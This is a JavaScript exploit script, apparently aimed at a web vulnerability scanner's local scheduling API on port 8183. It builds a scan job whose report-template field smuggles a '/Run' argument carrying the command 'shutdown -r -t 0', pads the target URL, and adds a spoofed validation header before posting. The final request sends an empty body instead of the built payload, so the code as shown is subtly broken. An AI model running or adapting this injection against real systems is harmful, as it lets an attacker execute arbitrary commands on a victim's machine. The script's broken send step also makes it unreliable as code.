var time = new Date();
var y = time.getFullYear();
var m = time.getMonth() + 1;
var d = time.getDate();
var hours = time.getHours();
var min = time.getMinutes() + 1;
var command = "shutdown -r -t 0";
var padding = "http://";
for (var i = 0; i < 2048; i++) padding += "a";

var exp = '{"scanType":"scan","targetList":"","target":["' + padding + '"],"recurse":"-1","date":"' + m + '/' + d + '/' +
    y + '","dayOfWeek":"1","dayOfMonth":"1","time":"' + hours + ':' + min +
    '","deleteAfterCompletion":"False","params":{"profile":"Default","loginSeq":"<none>","settings":"Default","scanningmode":"heuristic","excludedhours":"<none>","savetodatabase":"True","savelogs":"False","generatereport":"False","reportformat":"PDF","reporttemplate":"WVSDeveloperReport.rep /Crawl http://www.google.it /Run \\\"' +
    command + ' \\\"","emailaddress":""}}';


var xmlhttp;
if (window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
} else {
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.open("POST", "http://127.0.0.1:8183/api/addScan", true);
xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlhttp.setRequestHeader("RequestValidated", "true");
xmlhttp.send('');

